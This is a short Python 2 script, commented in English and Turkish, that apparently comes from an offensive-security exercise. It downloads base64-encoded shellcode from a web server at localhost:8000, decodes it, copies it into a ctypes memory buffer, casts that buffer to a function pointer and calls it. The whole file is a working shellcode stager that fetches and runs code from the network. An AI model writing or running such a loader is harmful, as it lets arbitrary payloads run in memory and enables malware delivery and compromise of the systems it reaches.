import urllib2
import ctypes
import base64

# retrieve the shellcode from our web server
url = "http://localhost:8000/shellcode.bin"
response = urllib2.urlopen(url) #base64 kodlu kabuk kodunu web suncusundan alarak baslatiyoruz

# decode the shellcode from base64 dhaa sonra kod cozudukten sonra kabuk kodunu tutmak icin bir buffer ayarlariz
shellcode = base64.b64decode(response.read())

# create a buffer in memory bufferi isaretci gibi kullanammaizi saglar
shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))

# create a function pointer to our shellcode bu shellcodun calistirilmasina neden olur
shellcode_func = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))

# call our shellcode
shellcode_func()
